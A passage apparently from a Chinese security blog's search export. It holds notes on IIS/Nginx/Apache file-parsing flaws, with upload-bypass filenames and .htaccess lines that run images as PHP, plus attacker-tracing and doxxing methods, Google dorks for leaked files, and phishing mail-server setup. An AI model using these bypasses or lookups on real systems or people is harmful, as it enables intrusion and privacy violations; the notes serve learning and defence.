[A,EAce][A,EAce][A,EAce][A,EAce] [A,EAce]2 [A,EAce]&gt;[A,EAce] |[DAdf]2 [DAdf]/[DAdf]/[DAdf] [CEGce]4 |[A,EAce]2 GA [A,EAce] GA |D[DAdf]/[DAdf]/ D[DAdf]/[DAdf]/ C [CEGce]/[CEGce]/ C[CEGce]/[CEGce]/ |[CEGce]8 | [CEGce]2 [CEGce]2 [CEGce]2 [CEGce]2 |]
GAB2 !style=harmonic![gb]4|GAB2 [K: style=harmonic]gbgb|
[K: style=x]
C/A,/ C/C/E C/zz2|
w:Rock-y did-nt like that</div>

<h3 id="series-系列文章"><a href="#series-系列文章" class="headerlink" title="series 系列文章"></a>series 系列文章</h3><ol class="series-items"><li><a href="/posts/4a17b156.html" title="Hello World">Hello World</a></li></ol>


<h1 id="code-test"><a href="#code-test" class="headerlink" title="code test"></a>code test</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#calendar&#x27;</span>).<span class="title function_">aCalendar</span>(<span class="string">&#x27;zh-CN&#x27;</span>);<span class="comment">//&#x27;zh-CN&#x27;请根据自己博客的语言选择</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>文章测试</tag>
      </tags>
  </entry>
  <entry>
    <title>解析漏洞知识记录</title>
    <url>/posts/64ae55e3.html</url>
    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
<p>将所有名字里含shell的文件识别为php脚本执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>让.jpg后缀名文件以php脚本执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>溯源小技巧</title>
    <url>/posts/7dea39be.html</url>
    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="溯源反制思路"><a href="#溯源反制思路" class="headerlink" title="溯源反制思路"></a>溯源反制思路</h2><p>反向渗透攻击IP、反向信息收集攻击IP、利用部署的蜜罐获取攻击者信息、溯源钓鱼邮件</p>
<h2 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h2><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等。<br>日志与流量分析，异常的通讯流量、攻击源与攻击目标等。<br>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等。<br>邮件钓鱼，获取恶意文件样本、钓鱼网站URL等。<br>蜜罐系统，获取攻击者行为、意图的相关信息。</p>
<h1 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h1><h2 id="反制手段"><a href="#反制手段" class="headerlink" title="反制手段"></a>反制手段</h2><p>IP定位技术：根据IP定位物理地址—代理IP。<br>ID追踪术：搜索引擎、社交平台、技术论坛、社工库匹配。<br>网站URL：域名WHOIS查询注册人姓名、地址、电话和邮箱。<br>恶意样本：提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析。<br>社交账号：基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 IP及社交信息等。</p>
<h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><p>攻击路径；<br>攻击目的：拿到权限、窃取数据、获取利益、DDOS等；<br>网络代理：代理IP、跳板机、C2服务器等；<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等。<br>攻击者身份画像：虚拟身份：ID、昵称、网名；真实身份：姓名、物理位置；<br>联系方式：手机号、QQ&#x2F;微信、邮箱；<br>组织情况：单位名称、职位信息。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="威胁情报厂商"><a href="#威胁情报厂商" class="headerlink" title="威胁情报厂商"></a>威胁情报厂商</h2><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>启明Venuseye：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a><br>绿盟NTI:<a href="https://nti.nsfocus.com/">https://nti.nsfocus.com/</a><br>奇安信：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a><br>安恒：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a><br>360：<a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></p>
<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>中国万网域名WHOIS信息查询地址：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>纳网域名WHOIS信息查询地址：<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>中资源域名WHOIS信息查询地址：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a><br>三五互联域名WHOIS信息查询地址：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a><br>新网互联域名WHOIS信息查询地址：<a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a><br>美橙互联域名WHOIS信息查询地址：<a href="https://whois.cndns.com/">https://whois.cndns.com/</a><br>爱名网域名WHOIS信息查询地址：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a><br>易名网域名WHOIS信息查询地址：<a href="https://whois.ename.net/">https://whois.ename.net/</a><br>站长工具类第三方查询地址(部分网站注册人信息会隐藏或提示联系域名注册商获取，可以去who.is查询看看)<br>Kali的查询：whois -h 注册服务器地址  域名<br>站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a><br>国外的who.is：<a href="https://who.is/">https://who.is/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a><br>还有Kali中自带的whois查询、一些集成工具等。<br>SSL证书查询网站整理如下：<br>主要网站如下：<br>（1）<a href="https://crt.sh/">https://crt.sh/</a><br>（2）<a href="https://censys.io/">https://censys.io/</a><br>（3）<a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br>（4）<a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p>
<h2 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h2><p>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a><br>爱站： <a href="https://www.aizhan.com/">https://www.aizhan.com/</a><br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
<h2 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h2><p>公众号：埃文科技、云警助手等<br>IPIP： <a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a> <a href="https://chaipip.com/aiwen.html">https://chaipip.com/aiwen.html</a></p>
<h1 id="确认个人信息"><a href="#确认个人信息" class="headerlink" title="确认个人信息"></a>确认个人信息</h1><h2 id="已知手机或邮箱"><a href="#已知手机或邮箱" class="headerlink" title="已知手机或邮箱"></a>已知手机或邮箱</h2><p>查支付宝转账，验证姓名。<br>QQ &#x2F;微信添加好友搜索<br>reg007进行相同手机号注册平台搜索<br>社交平台查找(头条、抖音、微博等)</p>
<h2 id="已知ID或姓名"><a href="#已知ID或姓名" class="headerlink" title="已知ID或姓名"></a>已知ID或姓名</h2><p>直接谷歌、百度、bing关键次搜索<br>各大平台SRC、各大白帽子交流群、交流论坛等<br>社交平台查找(贴吧、头条、抖音、微博等)</p>
<h2 id="捕获恶意文件"><a href="#捕获恶意文件" class="headerlink" title="捕获恶意文件"></a>捕获恶意文件</h2><p>解密、逆行脱壳等直接获取一些个人账号ID、CS服务器地址、一些域名信息、邮件发送服务器地址等</p>
<h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><p>tg社工库查询</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>溯源</tag>
      </tags>
  </entry>
  <entry>
    <title>googlehack</title>
    <url>/posts/19623025.html</url>
    <content><![CDATA[<h1 id="google-hacking-语法"><a href="#google-hacking-语法" class="headerlink" title="google hacking 语法"></a>google hacking 语法</h1><div class="note info no-icon flat"><p>目录遍历漏洞</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: intitle:index.of</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>配置文件泄露</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>数据库文件泄露</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: ext:sql | ext:dbf | ext:db | ext:mdb</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>日志文件泄露</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: ext:log</span><br></pre></td></tr></table></figure>
<div class="note info no-icon flat"><p>备份和历史文件</p>
</div>

<div class="note info no-icon flat"><p>配置文件泄露</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: ext:bkf | ext:bkp | ext:bak | ext:old | ext:backu</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>登录页面</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: inurl:login | inurl:admin | inurl:manage | inurl:system | inurl:backend | intitle:登陆 | intitle:后台 | intitle:管理 | intitle:认证</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>sql错误</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:&quot;Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>公开文件信息</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>phpinfo()</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>搜索Pastebin.com和其他粘贴站点</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org | site:codeshare.io | site:trello.com &quot;&quot;</span><br></pre></td></tr></table></figure>

<div class="note info no-icon flat"><p>搜索Github.com和Gitlab.com</p>
</div>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:github.com | site:gitlab.com &quot;&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>Google hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>ewomail钓鱼邮件服务器搭建</title>
    <url>/posts/2de21c49.html</url>
    <content><![CDATA[<h1 id="阿里云服务器本地尝试搭建ewomail失败："><a href="#阿里云服务器本地尝试搭建ewomail失败：" class="headerlink" title="阿里云服务器本地尝试搭建ewomail失败："></a>阿里云服务器本地尝试搭建ewomail失败：</h1><p>遇到报错：<br>1.python3.6中的一个加解密模块报错显示版本不再支持3.6<br>2.使用git或wget安装一键遇到问题<br>3.arguments参数报错<br>4.yum安装时遇到下载失败或部分包无法下载<br>5。安装ewomail时遇到amivasd的软件无法安装<br>报错原因：<br>第一个为使用yum依赖的是python3.6版本，安装高版本python3.8不能解决问题，一般可以无视<br>第二个问题单纯无法访问外网资源，可指定国内镜像安装<br>第三个是因为下载的ewomail一键安装脚本内的版本判断为centos7&#x2F;8，而我们的阿里云服务器为alibaba release 3，脚本识别失败报错<br>第四个是因为yum源未使用正确，且CentOS Linux 7 已经于 2024 年 6 月 30 日终止生命周期。大部分yum源已失效，可更换阿里云centos历史归档镜像源：<a href="https://mirrors.aliyun.com/centos-vault/?spm=a2c6h.25603864.0.0.4a41714fmPcm3B">https://mirrors.aliyun.com/centos-vault/?spm=a2c6h.25603864.0.0.4a41714fmPcm3B</a><br>第五个尝试使用对应版本镜像源安装amavis还是失败，放弃了，打算用docker搭建ewomail</p>
<h1 id="阿里云服务器docker搭建ewomail成功but服务器太垃圾运行卡死了"><a href="#阿里云服务器docker搭建ewomail成功but服务器太垃圾运行卡死了" class="headerlink" title="阿里云服务器docker搭建ewomail成功but服务器太垃圾运行卡死了"></a>阿里云服务器docker搭建ewomail成功but服务器太垃圾运行卡死了</h1><p>安装docker-&gt;docker pull 镜像-&gt;输入命令启动ewomail容器（这个成功了）<br>或<br>安装docker和docker-compose-&gt;生成docker-compose.yml文件并配置（不需要输入命令，很方便）-&gt;docker-compose -f指定yml文件 up -d运行启动容器（失败了）<br>阿里云服务器拉取成功，遭罪的事情开始了：<br>因为购买的阿里云服务器拉取的镜像ewomail内的软件amavis（反垃圾反病毒）随着容器自启动，电脑卡死，查看云服务器发现cpu占用率100%，使用top查看资源占用率发现amavis用户下的command clamd的cpu占用率80%。</p>
<h1 id="纯净环境-版本centos7-7-1908-啥都没有-的服务器本地搭建ewomial失败"><a href="#纯净环境-版本centos7-7-1908-啥都没有-的服务器本地搭建ewomial失败" class="headerlink" title="纯净环境&#x2F;版本centos7.7 1908&#x2F;啥都没有 的服务器本地搭建ewomial失败"></a>纯净环境&#x2F;版本centos7.7 1908&#x2F;啥都没有 的服务器本地搭建ewomial失败</h1><p>遇到报错：<br>python2.7更低了唉，不过yum还能用，尝试使用对应历史版本7.7 1908安装失败了。<br>ewomail脚本启动倒是没报错，不过还是关于amavis相关的三个包安装失败（还有些包也没安上没注意）</p>
<p>考虑到换了很多yum源仍然安装失败，计划使用docker提供的容器运行</p>
<h1 id="纯净环境-版本centos7-7-1908-使用docker搭建ewomail成功"><a href="#纯净环境-版本centos7-7-1908-使用docker搭建ewomail成功" class="headerlink" title="纯净环境&#x2F;版本centos7.7 1908 使用docker搭建ewomail成功"></a>纯净环境&#x2F;版本centos7.7 1908 使用docker搭建ewomail成功</h1><p>纯净环境，几乎什么命令都没装，docker搭建步骤同第二点<br>遇到报错：<br>1.安装docker和docker-compose时不能安装<br>2.docker拉取镜像失败<br>3.docker-compose启动yml文件失败报错格式存在问题<br>报错原因：<br>1.国外资源访问失败，可使用国内源安装<br>2.docker默认使用国外源，继续换国内源<br>3.如果你是直接用别人的yml文件粘贴，可能存在格式问题。yml内对空格和制表符识别有问题，需手动修改。（也可能复制的就是错的bushi）</p>
<h1 id="此部分为相关知识的命令运行"><a href="#此部分为相关知识的命令运行" class="headerlink" title="此部分为相关知识的命令运行"></a>此部分为相关知识的命令运行</h1><h2 id="使用alternatives对python版本进行更新与切换"><a href="#使用alternatives对python版本进行更新与切换" class="headerlink" title="使用alternatives对python版本进行更新与切换"></a>使用alternatives对python版本进行更新与切换</h2><p>linux已提供了对python&#x2F;java多版本的切换工具alternative<br>&#x2F;etc&#x2F;alternatives&#x2F;unversioned-python-&gt;&#x2F;usr&#x2F;bin&#x2F;python-&gt;python某版本解释器<br>即更新&#x2F;etc&#x2F;alternatives&#x2F;unversioned-python即可更新python版本<br>安装python</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install python3.8</span><br></pre></td></tr></table></figure>
<p>查看版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure>
<p>当前已安装python版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --display python</span><br></pre></td></tr></table></figure>
<p>切换python版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alternatives --config python</span><br></pre></td></tr></table></figure>
<p>设置pip软链接<br>使pip可使用pip3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/pip3 /usr/bin/pip</span><br><span class="line">或.bashrc下配置alias pip=&#x27;pip3&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><h2 id="yum源更换"><a href="#yum源更换" class="headerlink" title="yum源更换"></a>yum源更换</h2><h2 id="docker源更换"><a href="#docker源更换" class="headerlink" title="docker源更换"></a>docker源更换</h2><h2 id="docker和docker-compose相关命令"><a href="#docker和docker-compose相关命令" class="headerlink" title="docker和docker-compose相关命令"></a>docker和docker-compose相关命令</h2>]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>邮件服务器搭建</tag>
      </tags>
  </entry>
</search>
